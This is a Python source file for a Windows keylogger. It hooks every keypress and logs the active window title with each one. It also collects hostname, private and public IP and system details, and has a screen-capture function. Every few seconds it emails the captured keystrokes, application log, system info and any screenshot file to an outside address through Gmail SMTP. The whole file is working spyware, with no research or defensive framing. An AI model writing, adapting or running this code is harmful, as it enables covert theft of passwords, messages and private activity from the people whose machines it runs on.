import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import os
import psutil
import win32gui
from datetime import datetime
from dotenv import load_dotenv
from PIL import ImageGrab

# Load environment variables
load_dotenv()

# Use environment variables for sensitive information
sender_email = os.getenv('SENDER_EMAIL')
receiver_email = os.getenv('RECEIVER_EMAIL')
username = os.getenv('USERNAME')
password = os.getenv('PASSWORD')

# Dictionary to store the active application names
active_apps = {}

def get_active_app_name():
    # Get the name of the currently active window
    active_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return active_app

def screenshot():
    # Capture a screenshot of the entire screen
    im = ImageGrab.grab()
    im.save("screenshot.png")

def on_key_press(event, keys):
    # Handle keypress events
    if event.name == 'space':
        keys.append(' ')
    else:
        keys.append(event.name)

    # Capture active application at each key press
    active_app = get_active_app_name()
    if active_app:
        active_apps[event.time] = active_app

def write_to_file(keys):
    # Write captured keys to a text file
    with open('document.txt', 'a') as file:
        file.write(''.join(keys))
        keys.clear()

def write_application_log():
    # Write the log of active applications to a file
    with open('applicationLog.txt', 'a') as file:
        for timestamp, app_name in active_apps.items():
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
        active_apps.clear()

def send_email():
    # Email configuration
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'Captured Data'

    try:
        # Attach the document file
        with open('document.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='document.txt')
        message.attach(attachment)

        # Attach the system information file
        with open('syseminfo.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='syseminfo.txt')
        message.attach(attachment)

        # Attach the application log file
        with open('applicationLog.txt', 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='applicationLog.txt')
        message.attach(attachment)

        # Attach the screenshot if it exists
        screenshot_file = 'screenshot.png'
        if os.path.exists(screenshot_file):
            with open(screenshot_file, 'rb') as file:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file.read())

            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
            message.attach(attachment)

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(username, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print('Email sent successfully!')

    except smtplib.SMTPException as e:
        print(f'Failed to send email: {str(e)}')

def capture_keys():
    keys = []
    start_time = time.time()

    # Set up a callback for keypress events
    keyboard.on_press(lambda event: on_key_press(event, keys))

    try:
        # Start capturing keys until program is interrupted
        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time >= 5:  # Check if 5 seconds have elapsed
                write_to_file(keys)
                write_application_log()
                send_email()
                start_time = time.time()  # Reset timer

    except KeyboardInterrupt:
        pass

    finally:
        # Unhook all keyboard events when done
        keyboard.unhook_all()

def computer_information():
    # Generate system information and write it to a file
    system_information = "syseminfo.txt"
    with open(system_information, "w") as f:
        f.write("")

        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write('\n' + "Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Entry point of the script
if __name__ == "__main__":
    # Call the function to generate system information
    computer_information()

    # Call the function to start capturing keys and sending emails
    capture_keys()
